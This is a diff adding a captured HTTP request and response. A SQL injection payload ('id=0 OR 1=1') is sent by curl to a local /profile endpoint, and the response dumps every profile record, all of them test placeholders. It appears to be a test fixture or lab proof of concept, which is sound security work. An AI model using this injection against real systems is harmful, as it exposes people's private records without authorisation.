@@ -1,0 +1,5 @@
+=== REQUEST ===
+GET /profile?id=0 OR 1=1
+curl -s -G 'http://127.0.0.1:8066/profile' --data-urlencode 'id=0 OR 1=1'
+=== RESPONSE ===
+[{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]
